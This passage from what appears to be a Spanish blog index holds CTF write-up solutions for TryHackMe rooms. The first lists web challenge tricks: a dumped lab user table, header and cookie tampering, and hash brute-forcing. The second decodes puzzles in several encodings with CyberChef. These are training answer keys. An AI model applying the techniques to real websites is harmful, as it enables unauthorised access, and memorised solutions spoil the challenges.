obtenemos los datos de la base de datos.\n1 2 3 4 5 6 7 8 9 Database: THM_f0und_m3 Table: user [2 entries] +----------+------------------------------------+ | username | password | +----------+------------------------------------+ | DesKel | 05f3672ba[... snip ...]0070d1b | | Skidy | He is a nice guy, say hello for me | +----------+------------------------------------+ Easter 6 Vemos los headers de la pagina principal.\nEaster 7 Utilizamos el cookie Invited y con burpsuite le pasamos un numero, al ingresar el numero correcto obtenemos nuestra flag.\nEaster 8 Utilizamos los headers de Iphone.\nSolucion:\nEaster 9 Visitamos la pagina /ready y vemos el codigo fuente donde encontramos la flag.\nEaster 10 Debemos reclamar nuestro voucher.\nSolucion, referenciamos hacia tryhackme.com en los headers:\nEaster 11 En las opciones de la pagina principal vemos cuatro, pero vemos que \u0026ldquo;Deskel\u0026rdquo; prefiere huevo (egg). Enviamos egg en lugar de las opciones disponibles.\nSolucion:\nEaster 12 En el codigo javascript de la pagina encontramos una funcion, la ejecutamos para obtener nuestra flag.\nEaster 13 El reto 9 nos lleva al 13, la misma dinamica, el codigo fuente.\nEaster 14 En el codigo fuente de la pagina principal vemos un comentario que contiene una imagen codificada en base64. Renderizamos la imagen o descomentamos el comentario para obtener la flag.\nSolucion:\nEaster 15 En la pagina /game1 vemos un formulario con una pista. Utilizamos Burpsuite para insertar letras del abecedario, vemos el resultado de cada una de las letras que se muestran en \u0026ldquo;Your Hash\u0026rdquo; para poder comparar los datos (hash) con la pista (hash) que nos muestra en la pagina.\nSi ingresamos la letra \u0026ldquo;Z\u0026rdquo; y el resultado es \u0026ldquo;1000\u0026rdquo;, comparamos el resultado con la pista, si el resultado es igual que al de la pista tenemos nuestra primera letra \u0026ldquo;Z\u0026rdquo;. Repetimos hasta tener el resultado.\nResultado de 51 89 77 93 126 14 93 10.\nEaster 16 En la pagina /game2 debemos de presionar los tres botones al mismo tiempo, editamos el HTML para convertir los formularios en uno solo y damos click a un boton.\nSolucion:\nEaster 17 Encontramos un script en la pagina principal en binario.\nSolucion:\n1 Binary \u0026gt; Hex \u0026gt; Text Binary \u0026gt; Hex\nHex \u0026gt; Text\nEaster 18 Enviamos en los headers egg: Yes.\nSolucion:\nEaster 19 Vemos una imagen.webp que no se muestra en la pagina.\nSolucion:\nEaster 20 En este reto nos muestran un usuario y contraseña las cuales debemos de enviar por el metodo POST, en la pagina principal.\nSolucion:\n","description":"CTF collection Vol.2 en su version edicion es una serie de retos Web presentada por Deskel de TryHackMe.","id":164,"section":"posts","tags":[],"title":"TryHackMe - CTF collection Vol.2","uri":"https://sckull.github.io/posts/ctf_collection_vol2/"},{"content":"\rC4ptur3-th3-fl4g es una sala de TryHackMe que presenta una serie de retos, utilizamos CyberChef y herramientas en Linux para encontrar la solucion de cada uno de los retos.\nRoom Titulo c4ptur3-th3-fl4g Descripción A beginner level CTF challenge Puntos 420 Dificultad Facil Maker dcdavidlee Hashes Algunas paginas con las cuales podemos analizar el hash y resolver los retos en linea.\nHash Identification\nHash Analyzer\nCyberChef\nTranslation \u0026amp; Shifting #1 L33t o adivinando el mensaje. Reto:\nc4n y0u c4p7u23 7h3 f149?\nSolucion:\ncan you capture the flag?\n#2 From Binary Reto:\n01101100 01100101 01110100 01110011 00100000 01110100 01110010 01111001 00100000 01110011 01101111 01101101 01100101 00100000 01100010 01101001 01101110 01100001 01110010 01111001 00100000 01101111 01110101 01110100 00100001 Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Binary(\u0026#39;Space\u0026#39;)\u0026amp;input=MDExMDExMDAgMDExMDAxMDEgMDExMTAxMDAgMDExMTAwMTEgMDAxMDAwMDAgMDExMTAxMDAgMDExMTAwMTAgMDExMTEwMDEgMDAxMDAwMDAgMDExMTAwMTEgMDExMDExMTEgMDExMDExMDEgMDExMDAxMDEgMDAxMDAwMDAgMDExMDAwMTAgMDExMDEwMDEgMDExMDExMTAgMDExMDAwMDEgMDExMTAwMTAgMDExMTEwMDEgMDAxMDAwMDAgMDExMDExMTEgMDExMTAxMDEgMDExMTAxMDAgMDAxMDAwMDE #3 Base32 Reto:\nMJQXGZJTGIQGS4ZAON2XAZLSEBRW63LNN5XCA2LOEBBVIRRHOM====== Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Base32(\u0026#39;A-Z2-7%3D\u0026#39;,false)\u0026amp;input=TUpRWEdaSlRHSVFHUzRaQU9OMlhBWkxTRUJSVzYzTE5ONVhDQTJMT0VCQlZJUlJIT009PT09PT0 #4 Base64 Reto:\nRWFjaCBCYXNlNjQgZGlnaXQgcmVwcmVzZW50cyBleGFjdGx5IDYgYml0cyBvZiBkYXRhLg== Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)\u0026amp;input=UldGamFDQkNZWE5sTmpRZ1pHbG5hWFFnY21Wd2NtVnpaVzUwY3lCbGVHRmpkR3g1SURZZ1ltbDBjeUJ2WmlCa1lYUmhMZz09 #5 Hex Reto:\n68 65 78 61 64 65 63 69 6d 61 6c 20 6f 72 20 62 61 73 65 31 36 3f Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Hex(\u0026#39;Space\u0026#39;)\u0026amp;input=NjggNjUgNzggNjEgNjQgNjUgNjMgNjkgNmQgNjEgNmMgMjAgNmYgNzIgMjAgNjIgNjEgNzMgNjUgMzEgMzYgM2Y #6 Caesar Cipher Reto:\nEbgngr zr 13 cynprf! Decoder - Caesar Cipher\n#7 Rot47 Reto:\n*@F DA:? \u0026gt;6 C:89E C@F?5 323J C:89E C@F?5 Wcf E:\u0026gt;6DX Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=ROT47(47)\u0026amp;input=KkBGIERBOj8gPjYgQzo4OUUgQ0BGPzUgMzIzSiBDOjg5RSBDQEY/NSBXY2YgRTo%2BNkRY #8 Morse Code Reto:\n- . .-.. . -.-. --- -- -- ..- -. .. -.-. .- - .. --- -.\r. -. -.-. --- -.. .. -. --. Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Morse_Code(\u0026#39;Space\u0026#39;,\u0026#39;Line%20feed\u0026#39;)\u0026amp;input=LSAuIC4tLi4gLiAtLi0uIC0tLSAtLSAtLSAuLi0gLS4gLi4gLS4tLiAuLSAtIC4uIC0tLSAtLgoKLiAtLiAtLi0uIC0tLSAtLi4gLi4gLS4gLS0u #9 Decimal Reto:\n85 110 112 97 99 107 32 116 104 105 115 32 66 67 68 Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Decimal(\u0026#39;Space\u0026#39;,false)\u0026amp;input=ODUgMTEwIDExMiA5NyA5OSAxMDcgMzIgMTE2IDEwNCAxMDUgMTE1IDMyIDY2IDY3IDY4 #10 Base64 \u0026gt; Morse Code \u0026gt; Binary \u0026gt; Rot47 \u0026gt; Decimal Reto:\nLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0= Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Morse_Code(\u0026#39;Space\u0026#39;,\u0026#39;Line%20feed\u0026#39;)From_Binary(\u0026#39;Space\u0026#39;)ROT47(47)From_Decimal(\u0026#39;Space\u0026#39;,false)\u0026amp;input=TFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMaTB0TFMwS0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwS0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGk